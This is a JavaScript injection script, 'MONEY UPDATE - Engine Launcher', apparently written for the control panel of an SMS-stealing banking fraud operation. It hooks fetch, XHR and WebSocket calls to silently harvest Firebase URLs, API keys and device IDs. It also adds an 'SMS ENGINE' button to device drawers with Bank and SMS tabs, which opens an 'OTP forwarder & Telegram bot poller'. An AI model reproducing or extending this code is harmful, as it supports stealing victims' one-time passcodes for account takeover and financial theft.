// MONEY UPDATE - Engine Launcher
// - Always-visible floating button (top-right)
// - Auto-captures Firebase URL + API key from network calls
// - Detects open device detail panel (right-side drawer) and injects Engine button there
// - Shows device picker popup when no device is selected

(function() {
  'use strict';

  // ============== CAPTURE FIREBASE CONFIG ==============
  var capturedFbUrl = localStorage.getItem('engine_fb_url') || '';
  var capturedFbKey = localStorage.getItem('engine_fb_key') || '';
  var lastDeviceList = [];

  function captureFromUrl(url) {
    try {
      var u = String(url || '');
      var dbMatch = u.match(/https?:\/\/([a-z0-9-]+(?:-default-rtdb)?\.(?:firebaseio\.com|[a-z]+\.firebasedatabase\.app))/i);
      if (dbMatch && !capturedFbUrl) {
        capturedFbUrl = 'https://' + dbMatch[1];
        localStorage.setItem('engine_fb_url', capturedFbUrl);
        console.log('[Engine] Firebase URL captured:', capturedFbUrl);
      }
      var wsMatch = u.match(/wss?:\/\/([a-z0-9-]+(?:-default-rtdb)?\.(?:firebaseio\.com|[a-z]+\.firebasedatabase\.app))/i);
      if (wsMatch && !capturedFbUrl) {
        capturedFbUrl = 'https://' + wsMatch[1];
        localStorage.setItem('engine_fb_url', capturedFbUrl);
      }
      var keyMatch = u.match(/[?&](?:key|apikey|api_key)=([^&]+)/i);
      if (keyMatch && !capturedFbKey) {
        capturedFbKey = decodeURIComponent(keyMatch[1]);
        localStorage.setItem('engine_fb_key', capturedFbKey);
      }
      var aizaMatch = u.match(/AIza[A-Za-z0-9_-]{35}/);
      if (aizaMatch && !capturedFbKey) {
        capturedFbKey = aizaMatch[0];
        localStorage.setItem('engine_fb_key', capturedFbKey);
      }
    } catch (e) {}
  }

  function captureFromBody(body) {
    try {
      var s = '';
      if (typeof body === 'string') s = body;
      else if (body && body.toString) s = body.toString();
      if (!s) return;
      // Capture device IDs from JSON responses
      var idMatches = s.match(/"([A-Z]\d{3,5}|[A-Z]+\d{3,8})"/g);
      if (idMatches) {
        idMatches.forEach(function(m) {
          var id = m.replace(/"/g, '');
          if (id.length >= 4 && id.length <= 16 && lastDeviceList.indexOf(id) === -1) {
            lastDeviceList.push(id);
          }
        });
        if (lastDeviceList.length > 0) {
          localStorage.setItem('engine_known_devices', JSON.stringify(lastDeviceList.slice(0, 200)));
        }
      }
    } catch (e) {}
  }

  // Hook fetch
  if (window.fetch) {
    var origFetch = window.fetch;
    window.fetch = function(input, init) {
      try { captureFromUrl(typeof input === 'string' ? input : (input && input.url) || ''); } catch (e) {}
      var p = origFetch.apply(this, arguments);
      try {
        p.then(function(r) {
          try {
            var c = r.clone();
            c.text().then(captureFromBody).catch(function() {});
          } catch (e) {}
        }).catch(function() {});
      } catch (e) {}
      return p;
    };
  }

  // Hook XHR
  var origOpen = XMLHttpRequest.prototype.open;
  XMLHttpRequest.prototype.open = function(method, url) {
    try { captureFromUrl(url); } catch (e) {}
    this.addEventListener('load', function() {
      try { captureFromBody(this.responseText); } catch (e) {}
    });
    return origOpen.apply(this, arguments);
  };

  // Hook WebSocket
  var OrigWS = window.WebSocket;
  if (OrigWS) {
    var WSWrap = function(url, protocols) {
      try { captureFromUrl(url); } catch (e) {}
      var ws = protocols ? new OrigWS(url, protocols) : new OrigWS(url);
      try {
        var origAddEvt = ws.addEventListener;
        ws.addEventListener('message', function(ev) {
          try { captureFromBody(ev.data); } catch (e) {}
        });
      } catch (e) {}
      return ws;
    };
    WSWrap.prototype = OrigWS.prototype;
    Object.keys(OrigWS).forEach(function(k) { try { WSWrap[k] = OrigWS[k]; } catch (e) {} });
    window.WebSocket = WSWrap;
  }

  // Recover known devices
  try {
    var saved = localStorage.getItem('engine_known_devices');
    if (saved) lastDeviceList = JSON.parse(saved) || [];
  } catch (e) {}

  // ============== STYLES ==============
  var style = document.createElement('style');
  style.textContent = [
    '#sms-engine-fab{',
    '  position:fixed;top:14px;right:14px;z-index:2147483647;',
    '  background:linear-gradient(135deg,#4ade80,#22c55e);color:#000;',
    '  border:none;padding:10px 18px;border-radius:50px;',
    '  font-family:Inter,system-ui,sans-serif;font-size:12px;font-weight:800;',
    '  letter-spacing:.5px;cursor:pointer;',
    '  box-shadow:0 4px 20px rgba(74,222,128,.5);',
    '  display:inline-flex;align-items:center;gap:6px;',
    '  transition:transform .15s,box-shadow .15s;',
    '}',
    '#sms-engine-fab:hover{transform:translateY(-1px);box-shadow:0 6px 28px rgba(74,222,128,.7);}',
    '#sms-engine-fab::before{content:"\\26A1";font-size:14px;}',

    '#sms-engine-modal-bg{',
    '  position:fixed;inset:0;background:rgba(0,0,0,.75);',
    '  z-index:2147483646;display:flex;align-items:center;justify-content:center;',
    '  font-family:Inter,system-ui,sans-serif;',
    '}',
    '#sms-engine-modal{',
    '  background:#0f0f0f;border:1px solid #2a2a2a;border-radius:14px;',
    '  padding:24px;width:480px;max-width:90vw;max-height:80vh;overflow:auto;',
    '  color:#fff;box-shadow:0 20px 60px rgba(0,0,0,.6);',
    '}',
    '#sms-engine-modal h3{font-size:16px;margin:0 0 6px 0;color:#4ade80;}',
    '#sms-engine-modal p{font-size:12px;color:#888;margin:0 0 16px 0;}',
    '#sms-engine-modal label{display:block;font-size:11px;color:#888;margin:10px 0 4px;font-weight:600;}',
    '#sms-engine-modal input{',
    '  width:100%;padding:10px 12px;background:#1a1a1a;border:1px solid #2a2a2a;',
    '  border-radius:8px;color:#fff;font-size:13px;font-family:inherit;box-sizing:border-box;',
    '}',
    '#sms-engine-modal input:focus{outline:none;border-color:#4ade80;}',
    '#sms-engine-modal .row{display:flex;gap:8px;margin-top:16px;}',
    '#sms-engine-modal button{',
    '  flex:1;padding:11px;border:none;border-radius:8px;cursor:pointer;',
    '  font-weight:700;font-size:13px;font-family:inherit;letter-spacing:.3px;',
    '}',
    '#sms-engine-modal .btn-primary{background:linear-gradient(135deg,#4ade80,#22c55e);color:#000;}',
    '#sms-engine-modal .btn-cancel{background:#1a1a1a;color:#888;border:1px solid #2a2a2a !important;}',
    '#sms-engine-modal .device-chip{',
    '  display:inline-block;background:#1a1a1a;border:1px solid #2a2a2a;',
    '  color:#4ade80;padding:6px 12px;border-radius:20px;margin:3px;cursor:pointer;',
    '  font-size:12px;font-weight:600;transition:all .15s;',
    '}',
    '#sms-engine-modal .device-chip:hover{background:#4ade80;color:#000;}',
    '#sms-engine-modal .chip-list{max-height:180px;overflow-y:auto;padding:8px;background:#0a0a0a;border-radius:8px;border:1px solid #1f1f1f;}',
    '#sms-engine-modal .chip-list-empty{color:#555;font-size:12px;font-style:italic;padding:10px;}',

    '.sms-engine-injected-btn{',
    '  display:inline-flex;align-items:center;gap:6px;',
    '  background:linear-gradient(135deg,#4ade80,#22c55e);color:#000;',
    '  border:none;padding:8px 14px;border-radius:8px;',
    '  font-family:Inter,system-ui,sans-serif;font-size:12px;font-weight:700;',
    '  cursor:pointer;margin:8px 4px;',
    '  box-shadow:0 2px 10px rgba(74,222,128,.3);',
    '}',
    '.sms-engine-injected-btn::before{content:"\\26A1";}',
    '.sms-engine-injected-btn:hover{transform:translateY(-1px);box-shadow:0 4px 16px rgba(74,222,128,.5);}'
  ].join('');
  document.head.appendChild(style);

  // ============== FLOATING BUTTON ==============
  var fab = document.createElement('button');
  fab.id = 'sms-engine-fab';
  fab.textContent = 'SMS ENGINE';
  fab.title = 'Open SMS Engine';
  fab.addEventListener('click', function() {
    var ctx = grabContextFromOpenPanel();
    showModal(ctx.deviceId);
  });
  function placeFab() {
    if (!document.body.contains(fab)) document.body.appendChild(fab);
  }
  if (document.body) placeFab();
  else document.addEventListener('DOMContentLoaded', placeFab);

  // ============== MODAL ==============
  function escapeHtml(s) {
    return String(s == null ? '' : s).replace(/[&<>"']/g, function(m) {
      return {'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[m];
    });
  }

  function showModal(prefillDeviceId) {
    closeModal();
    var fbUrl = capturedFbUrl || localStorage.getItem('engine_fb_url') || '';
    var fbKey = capturedFbKey || localStorage.getItem('engine_fb_key') || '';
    var deviceId = prefillDeviceId || localStorage.getItem('engine_device_id') || '';

    var devList = lastDeviceList.length ? lastDeviceList : (function() {
      try { return JSON.parse(localStorage.getItem('engine_known_devices') || '[]'); } catch (e) { return []; }
    })();

    var bg = document.createElement('div');
    bg.id = 'sms-engine-modal-bg';
    bg.innerHTML = [
      '<div id="sms-engine-modal" onclick="event.stopPropagation()">',
      '  <h3>\u26A1 SMS Engine</h3>',
      '  <p>Configure OTP forwarder &amp; Telegram bot poller for a device.</p>',

      '  <label>Firebase Database URL</label>',
      '  <input id="sms-engine-fb-url" placeholder="https://your-project.firebaseio.com" value="', escapeHtml(fbUrl), '">',

      '  <label>Firebase API Key (optional)</label>',
      '  <input id="sms-engine-fb-key" placeholder="AIzaSy..." value="', escapeHtml(fbKey), '">',

      '  <label>Device ID</label>',
      '  <input id="sms-engine-device-id" placeholder="e.g. V2336" value="', escapeHtml(deviceId), '">',

      devList.length ? [
        '  <label style="margin-top:12px;">Detected Devices (click to select)</label>',
        '  <div class="chip-list">',
        devList.slice(0, 80).map(function(d) {
          return '<span class="device-chip" data-dev="' + escapeHtml(d) + '">' + escapeHtml(d) + '</span>';
        }).join(''),
        '  </div>'
      ].join('') : [
        '  <label style="margin-top:12px;">Detected Devices</label>',
        '  <div class="chip-list"><span class="chip-list-empty">No devices auto-detected yet. Open a device in the panel first, or type the ID above.</span></div>'
      ].join(''),

      '  <div class="row">',
      '    <button class="btn-cancel" id="sms-engine-cancel">Cancel</button>',
      '    <button class="btn-primary" id="sms-engine-go">Open Engine \u2192</button>',
      '  </div>',
      '</div>'
    ].join('');
    bg.addEventListener('click', closeModal);
    document.body.appendChild(bg);

    document.getElementById('sms-engine-cancel').addEventListener('click', closeModal);
    document.getElementById('sms-engine-go').addEventListener('click', function() {
      var u = document.getElementById('sms-engine-fb-url').value.trim();
      var k = document.getElementById('sms-engine-fb-key').value.trim();
      var d = document.getElementById('sms-engine-device-id').value.trim();
      if (!u) { alert('Firebase URL required'); return; }
      if (!d) { alert('Device ID required'); return; }
      capturedFbUrl = u; localStorage.setItem('engine_fb_url', u);
      if (k) { capturedFbKey = k; localStorage.setItem('engine_fb_key', k); }
      localStorage.setItem('engine_device_id', d);
      openEngineWindow(u, k, d);
      closeModal();
    });

    Array.prototype.forEach.call(bg.querySelectorAll('.device-chip'), function(c) {
      c.addEventListener('click', function() {
        document.getElementById('sms-engine-device-id').value = c.getAttribute('data-dev');
      });
    });
  }

  function closeModal() {
    var bg = document.getElementById('sms-engine-modal-bg');
    if (bg) bg.remove();
  }

  function openEngineWindow(fbUrl, fbKey, deviceId) {
    var params = new URLSearchParams();
    params.set('fb', fbUrl);
    if (fbKey) params.set('key', fbKey);
    params.set('device', deviceId);
    window.open('engine.html?' + params.toString(), '_blank', 'width=1400,height=900');
  }

  // ============== DETECT OPEN DEVICE PANEL & INJECT BUTTON ==============
  // Pattern: panel has a right-side drawer that opens when a device is clicked.
  // It contains a header with the device ID (V2336 etc.) and tabs Info | Bank | SMS | Send.

  var injectedHosts = new WeakSet();

  function grabContextFromOpenPanel() {
    var ctx = { deviceId: '' };
    // Look for the smallest container that holds an "Info"+"Send" tab pair (the drawer header area)
    var drawer = findDeviceDrawer();
    if (drawer) {
      var id = extractDeviceIdFromDrawer(drawer);
      if (id) {
        ctx.deviceId = id;
        ctx.drawer = drawer;
        localStorage.setItem('engine_device_id', id);
      }
    }
    return ctx;
  }

  function findDeviceDrawer() {
    // Find an element that has both "Info" and "Send" tab-like text within
    var candidates = document.querySelectorAll('div, section, aside');
    for (var i = 0; i < candidates.length; i++) {
      var el = candidates[i];
      var rect = el.getBoundingClientRect();
      if (rect.width < 240 || rect.width > 600) continue;
      if (rect.height < 300) continue;
      var text = el.innerText || '';
      if (text.length < 30 || text.length > 8000) continue;
      // Must contain typical drawer tabs
      if (!/\bInfo\b/i.test(text)) continue;
      if (!/\bSend\b/i.test(text)) continue;
      // Prefer right-positioned drawers
      if (rect.right < window.innerWidth - 50 && rect.left < window.innerWidth - rect.width - 50) {
        // Not on the right edge - skip
        continue;
      }
      return el;
    }
    return null;
  }

  function extractDeviceIdFromDrawer(drawer) {
    // Heading-like elements first
    var heads = drawer.querySelectorAll('h1, h2, h3, h4, [class*="title"], [class*="name"], [class*="heading"]');
    for (var i = 0; i < heads.length; i++) {
      var t = (heads[i].innerText || '').trim();
      if (!t) continue;
      var m = t.match(/^([A-Z][A-Z0-9]{1,15})$/);
      if (m) return m[1];
    }
    // Fallback: first short alphanumeric-uppercase token in the drawer
    var text = drawer.innerText || '';
    var lines = text.split(/\r?\n/);
    for (var j = 0; j < lines.length; j++) {
      var line = lines[j].trim();
      if (line.length < 2 || line.length > 16) continue;
      if (/^[A-Z][A-Z0-9]{1,15}$/.test(line)) return line;
    }
    return '';
  }

  function injectIntoDrawer() {
    var drawer = findDeviceDrawer();
    if (!drawer) return;
    if (injectedHosts.has(drawer)) {
      // Verify button still in DOM, else re-inject
      if (drawer.querySelector('.sms-engine-injected-btn')) return;
      injectedHosts.delete(drawer);
    }
    var deviceId = extractDeviceIdFromDrawer(drawer);
    if (!deviceId) return;

    // Place button at top of drawer body
    var btn = document.createElement('button');
    btn.className = 'sms-engine-injected-btn';
    btn.textContent = 'SMS ENGINE';
    btn.setAttribute('data-engine-device', deviceId);
    btn.addEventListener('click', function(ev) {
      ev.preventDefault(); ev.stopPropagation();
      var fbUrl = capturedFbUrl || localStorage.getItem('engine_fb_url') || '';
      if (!fbUrl) { showModal(deviceId); return; }
      openEngineWindow(fbUrl, capturedFbKey, deviceId);
    });

    // Find a good spot: above the tab strip or right after the heading
    var insertTarget = drawer.querySelector('h1, h2, h3, h4, [class*="title"], [class*="header"]');
    if (insertTarget && insertTarget.parentNode) {
      insertTarget.parentNode.insertBefore(btn, insertTarget.nextSibling);
    } else {
      drawer.insertBefore(btn, drawer.firstChild);
    }

    injectedHosts.add(drawer);
    console.log('[Engine] Button injected for device:', deviceId);
  }

  // ============== BOOT ==============
  function boot() {
    placeFab();
    injectIntoDrawer();

    var observer = new MutationObserver(function() {
      if (boot._t) return;
      boot._t = setTimeout(function() {
        boot._t = null;
        placeFab();
        injectIntoDrawer();
      }, 200);
    });
    observer.observe(document.body, { childList: true, subtree: true });

    setInterval(function() {
      placeFab();
      injectIntoDrawer();
    }, 1500);
  }

  if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', boot);
  } else {
    boot();
  }

  // Expose for debugging
  window._smsEngine = {
    open: function(deviceId) { showModal(deviceId); },
    config: function() { return { fbUrl: capturedFbUrl, fbKey: capturedFbKey ? '****' : '', devices: lastDeviceList.length }; },
    reset: function() {
      ['engine_fb_url','engine_fb_key','engine_device_id','engine_known_devices'].forEach(function(k){localStorage.removeItem(k);});
      capturedFbUrl=''; capturedFbKey=''; lastDeviceList=[];
      console.log('[Engine] Reset done');
    }
  };
  console.log('[Engine] Launcher loaded. Use window._smsEngine for debug.');
})();
